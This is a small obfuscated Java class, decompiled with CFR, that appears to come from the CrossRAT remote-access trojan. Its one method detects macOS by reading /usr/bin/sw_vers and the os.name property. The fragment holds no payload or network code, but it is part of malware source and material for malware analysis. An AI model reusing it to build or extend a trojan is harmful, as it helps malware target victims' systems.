/*
 * Decompiled with CFR 0_124.
 */
package a.c;

import a.c;
import crossrat.e;
import java.io.File;
import java.util.Iterator;

public final class a {
    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public static boolean a(boolean bl) {
        Object object = new File("/usr/bin/sw_vers");
        try {
            object = e.a((File)object);
            Iterator iterator = object.iterator();
            while (iterator.hasNext()) {
                object = (String)iterator.next();
                if (!object.contains(c.b.a())) continue;
                return true;
            }
        }
        catch (Exception exception) {
            object = exception;
            exception.printStackTrace();
        }
        if (!bl) {
            return false;
        }
        object = System.getProperty("os.name").toLowerCase();
        if (!object.contains("mac os x") && !object.contains("macos")) {
            return false;
        }
        return true;
    }
}
